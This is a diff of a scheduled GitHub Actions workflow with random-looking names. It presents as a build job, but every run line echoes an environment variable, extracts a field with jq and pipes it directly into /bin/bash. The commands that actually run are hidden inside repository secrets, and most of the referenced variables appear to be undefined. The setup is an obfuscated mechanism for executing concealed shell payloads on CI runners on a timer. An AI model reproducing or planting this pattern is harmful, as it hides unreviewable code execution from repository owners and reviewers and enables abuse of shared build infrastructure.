@@ -1,31 +1,20 @@
 name: wryfacility
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
-jobs:  # 18930
+    - cron: '11 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wryfacility
         env:
-          gjj8: ${{ secrets.gjj8 }}
+          tor679: ${{ secrets.tor679 }}
         run: |
-          echo $gjj8 | jq -r .etn109 | /bin/bash
-          echo $yhgzg29 | jq -r .r21 | /bin/bash
-          echo $bl06718 | jq -r .npb4982 | /bin/bash
-          echo $b0 | jq -r .adu281 | /bin/bash
-          echo $vtuh99 | jq -r .qvvb9710 | /bin/bash
-          echo $inirs33459 | jq -r .c9764 | /bin/bash
-          echo $kkl5 | jq -r .ps994 | /bin/bash
-          echo $tfs18 | jq -r .gcnf358 | /bin/bash
-          echo $ihac591 | jq -r .zcwfr722 | /bin/bash
-          echo $ej9754 | jq -r .ja38520 | /bin/bash
-          echo $mt1001 | jq -r .xgh9 | /bin/bash
-          echo $f5 | jq -r .bb66673 | /bin/bash
-          echo $pr4 | jq -r .yrzk29 | /bin/bash
-          echo $s3 | jq -r .wb46178 | /bin/bash
-          echo $h74 | jq -r .fjuhn5394 | /bin/bash
-          echo $ab0552 | jq -r .su186 | /bin/bash
+          echo $tor679 | jq -r .oofb401 | /bin/bash
+          echo $emoki663 | jq -r .fu95 | /bin/bash
+          echo $cv22 | jq -r .tvwwv881 | /bin/bash
+          echo $f790 | jq -r .v19939 | /bin/bash
 
